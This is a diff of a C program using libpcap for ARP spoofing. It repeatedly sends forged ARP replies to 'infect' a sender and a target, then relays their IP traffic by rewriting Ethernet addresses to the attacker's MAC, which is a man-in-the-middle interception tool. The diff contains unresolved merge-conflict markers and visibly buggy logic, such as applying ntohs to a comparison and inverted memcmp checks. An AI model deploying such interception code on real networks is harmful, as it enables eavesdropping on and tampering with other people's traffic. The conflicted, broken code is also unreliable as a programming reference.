@@ -139,7 +139,11 @@ int usage(){
     char * response_packet_pointer = (char*)malloc(sizeof(char) * 42);
     Ethernet_Header * eth_res = (Ethernet_Header *)response_packet_pointer;
     ARP_Header * arp_res = (ARP_Header *)(response_packet_pointer + 14);
+<<<<<<< HEAD
     IP_Header * IP_res = (IP_Header *)(response_packet_pointer+14);
+=======
+    IP_Header * IP_res =(IP_Header *)(response_packet_pointer+14);
+>>>>>>> 5701587f722d61282b238bf10a1d5d16e802bad9
     default_setting(eth2, arp2);
     while(1){
         pcap_sendpacket(handle, (u_char*)sendpacket, 42);//infect sender
@@ -156,29 +160,38 @@ int usage(){
         if(response==0) {printf("response: 0\n");continue;}
         else if (response == -1 || response == -2) break;
         else printf("spoofing\n");
-        printf("relaying packet\n");
 
+<<<<<<< HEAD
         printf("%4x \n",eth_res->type);
 
+=======
+>>>>>>> 5701587f722d61282b238bf10a1d5d16e802bad9
         if(ntohs(eth_res->type)==0x0806){
             printf("ARP\nInfecting again\n");
             pcap_sendpacket(handle, (u_char*)sendpacket, 42);//infect sender
             pcap_sendpacket(handle, (u_char*)sendpacket2, 42);//infect target
             continue;
         }
+<<<<<<< HEAD
         else if(ntohs(eth_res->type)==0x0800){
             //check if it's IP header
             printf("Not ARP\n");
             //check IP header's dest, source instead of arp.
             if(memcmp(eth_res->S_addr, target_MAC, 6)&& memcmp(arp_res->D_P_addr, sender_IP, 4)){
+=======
+        else if(ntohs(eth_res->type==0x0800)){//check if its ip
+            printf("IP\n");
+            if(memcmp(eth_res->S_addr, target_MAC, 6)&& memcmp(IP_res->D_IP, sender_IP, 4)){
+>>>>>>> 5701587f722d61282b238bf10a1d5d16e802bad9
                 printf("From target\n");
+                //change eth MAC's dest and source
+                memcpy(eth_res->S_addr, attacker_MAC, 6);
                 memcpy(eth_res->D_addr, sender_MAC, 6);
-                memcpy(arp_res->D_H_addr, sender_MAC, 6);
             }
-            else if(memcmp(eth_res->S_addr, sender_MAC, 6) && memcmp(arp_res->D_P_addr, target_IP, 4)){
+            else if(memcmp(eth_res->S_addr, sender_MAC, 6) && memcmp(IP_res->D_IP, target_IP, 4)){
                 printf("From sender\n");
+                memcpy(eth_res->S_addr, attacker_MAC, 6);
                 memcpy(eth_res->D_addr, target_MAC, 6);
-                memcpy(arp_res->D_H_addr, target_MAC, 6);
             }
 
         }
